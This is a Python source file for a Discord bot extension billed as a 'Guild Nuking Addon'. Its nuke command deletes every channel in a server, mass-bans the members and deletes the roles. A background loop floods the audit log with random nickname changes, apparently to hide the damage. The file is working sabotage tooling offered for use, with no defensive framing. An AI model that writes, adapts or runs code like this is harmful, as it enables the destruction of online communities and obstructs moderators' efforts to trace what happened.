from string import ascii_letters
from random import choice
from asyncio import sleep

from discord.errors import Forbidden
from discord.ext import commands


class Nuker:
    """
    Guild Nuking Addon
    """

    def __init__(self, bot):
        self.bot = bot
        self.guilds = []

    @commands.command(pass_context=True)
    async def nuke(self, ctx):
        """
        Nuke current server
        """

        print("[Nuke]({}) Starting nuke".format(ctx.guild.id))

        self.guilds.append(ctx.guild)
        print("[Auditspam]({}) Starting auditspam".format(ctx.guild.id))

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                pass

        for member in [x for x in ctx.guild.members if x != ctx.guild.me and x.id not in self.bot.allowedusers.id]:
            try:
                await member.ban(delete_message_days=0)
            except:
                pass

        while [x for x in ctx.guild.roles if x.name != "@everyone" and x < ctx.guild.me.top_role]:
            for role in [x for x in ctx.guild.roles if x.name != "@everyone" and x < ctx.guild.me.top_role]:
                await role.delete()

        print("[Nuke]({}) nuke complete".format(ctx.guild.id))

    @commands.command(pass_context=True)
    async def startaudit(self, ctx):
        """
        Start audit log spam to the current server
        """

        self.guilds.append(ctx.message.guild)
        print("[Auditspam]({}) Starting auditspam".format(ctx.guild.id))

    @commands.command(pass_context=True)
    async def stopaudit(self, ctx):
        """
        Stop audit log spam to the current server
        """

        self.guilds.remove(ctx.message.guild)
        print("[Auditspam]({}) Stopping auditspam".format(ctx.guild.id))

    async def auditspam(self):
        await self.bot.wait_until_ready()
        # loop while this cog is loaded
        while self == self.bot.get_cog('Nuker'):
            for i in self.guilds:
                try:
                    await i.me.edit(reason="".join([choice(ascii_letters) for x in range(15)]), nick="".join([choice(ascii_letters) for x in range(15)]))
                except Forbidden:
                    self.guilds.remove(i)
                    print(
                        "[Auditspam]({}) Can't change nickname, stopping".format(i.id))
            await sleep(2)


def setup(bot):
    b = Nuker(bot)
    bot.add_cog(b)
    bot.loop.create_task(b.auditspam())
